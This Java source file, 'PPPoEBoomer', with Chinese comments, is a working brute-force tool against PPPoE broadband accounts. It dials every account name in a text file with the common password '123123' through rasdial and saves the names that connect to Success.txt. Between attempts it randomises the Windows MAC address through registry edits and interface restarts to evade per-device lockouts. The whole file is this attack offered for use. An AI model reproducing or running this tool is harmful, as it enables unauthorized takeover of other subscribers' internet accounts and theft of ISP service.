/**
 * @(#)PPPoEBoomer.java
 *
 *
 * @author 
 * @version 1.00 2017/10/11
 */
 
import java.io.*;
import java.util.Random;
import java.net.*;

public class PPPoEBoomer {
	public static String PASSWORD="123123";
	//随机mac地址，并返回String字符串
	public static String randomMac(){
		Random random=new Random();
		String[] mac={
			String.format("%02x",0x00),
			String.format("%02x",random.nextInt(0xff)),
			String.format("%02x",random.nextInt(0xff)),
			String.format("%02x",random.nextInt(0xff)),
			String.format("%02x",random.nextInt(0xff)),
			String.format("%02x",random.nextInt(0xff))
		};
		String[] upperCaseMac={
			mac[0],
			mac[1].toUpperCase(),
			mac[2].toUpperCase(),
			mac[3].toUpperCase(),
			mac[4].toUpperCase(),
			mac[5].toUpperCase()
		};
		return String.join("",upperCaseMac);
	}
	
	//获得网卡地址
	private static String getMac() throws Exception{
		String commandPrefix = "cmd.exe /k reg query ";
		String line=null;
		String mac=null;
		String str="00";
		String key ="HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e972-e325-11ce-bfc1-08002be10318}\\0001 ";
		try{
			Process process = Runtime.getRuntime().exec(commandPrefix + key + "/v " + "NetworkAddress");
			BufferedReader  bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
			while((line=bufferedReader.readLine())!=null){
				if(line.contains("NetworkAddress")){
					mac=line.substring(32);
					break;
				}
			}
		} catch (IOException e){
				e.printStackTrace();
			}
	return mac;
	}
	
	//执行CMD命令并返回String字符串
	public static String executeCmd(String strCmd) throws Exception{
		Process p=Runtime.getRuntime().exec("cmd /c"+strCmd);
		StringBuilder sbCmd=new StringBuilder();
		BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
		String line;
		while((line=br.readLine())!=null){
			sbCmd.append(line+"\n");
		}
		return sbCmd.toString();
	}
	
	//连接ADSL
	public static boolean connAdsl(String title,String name,String password){
		String line=null;
		String done="命令已完成";
		String fail="错误";
		boolean state=false;
		try{
			Process process = Runtime.getRuntime().exec("rasdial "+title+" "+name+" "+password);
			BufferedReader  bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream())); 
			while((line=bufferedReader.readLine())!=null){
				System.out.println (line);
				if(line.contains(done)){
					state=true;
					break;
				} else {
					if(line.contains(fail)){
						state=false;
						break;
					}
				}
			}
		} catch (IOException e){
				e.printStackTrace();
			}
	return state;
	}
	
	//断开ADSL
	public static boolean cutAdsl(String adslTitle) throws Exception{
		String cutAdsl="rasdial"+adslTitle+"/disconnect";
		String result=executeCmd(cutAdsl);
		if(result.indexOf("没有连接")!=-1){
			System.err.println(adslTitle+"连接不存在！");
			return false;
		}else{
			System.out.println("连接已断开");
			return true;
		}
	}
	
	//修改mac地址
	public static void changeMac(String mac) throws Exception {
		String commandPrefix = "cmd.exe /k reg add ";
		String enabledNet= "cmd.exe /k netsh interface set interface \"以太网\" enabled";
		String disabledNet="cmd.exe /k netsh interface set interface \"以太网\" disabled";
		String key ="HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e972-e325-11ce-bfc1-08002be10318}\\0001 ";
		Runtime.getRuntime().exec(disabledNet);
		Runtime.getRuntime().exec(commandPrefix + key + "/v " + "NetworkAddress " + "/t " + "REG_SZ " + "/d " + mac + " /f");
		System.out.println ("正在随机MacAddress...");
		Thread.sleep(1000);
		Runtime.getRuntime().exec(enabledNet);
		Thread.sleep(5000);
	}
	
	//写入txt方法
	public static void writeLineFile(String filename, String content){  
        try {  
            FileOutputStream out = new FileOutputStream(filename,true);  
            OutputStreamWriter outWriter = new OutputStreamWriter(out);  
            BufferedWriter bufWrite = new BufferedWriter(outWriter); 
            bufWrite.write(content + "\r\n"); 
            bufWrite.flush();
            bufWrite.close();  
            outWriter.close();  
            out.close();  
        } catch (Exception e) {  
            e.printStackTrace();  
            System.out.println("读取" + filename + "出错！");
        }         
    }  

	//主方法
	public static void main(String[] args) throws Exception{
		InetAddress ia=InetAddress.getLocalHost();
		String filename="Account.txt";//pppoe账号所在文件
		try { 
			FileInputStream in = new FileInputStream(filename);
			InputStreamReader inReader = new InputStreamReader(in);  
			BufferedReader bufReader = new BufferedReader(inReader);  
			String line = null;  
			int i = 1;  //标记点
			while((line = bufReader.readLine()) != null){
				System.out.println("开始尝试连接第"+i+"个账号......");
				if(connAdsl("宽带连接",line,PASSWORD)){
					writeLineFile("Success.txt",line+"@"+getMac());
					System.out.println("第"+i+"个账号连接成功！已保存！");
					cutAdsl("宽带连接");
				}else{
					System.out.println("第"+i+"个账号连接失败！");
				}
				i++;  
				changeMac(randomMac());
			}  
			bufReader.close();  
			inReader.close();  
			in.close();  
		} catch (Exception e) {
			e.printStackTrace();  
			System.out.println("读取" + filename + "出错！");  
		}  
	}
}
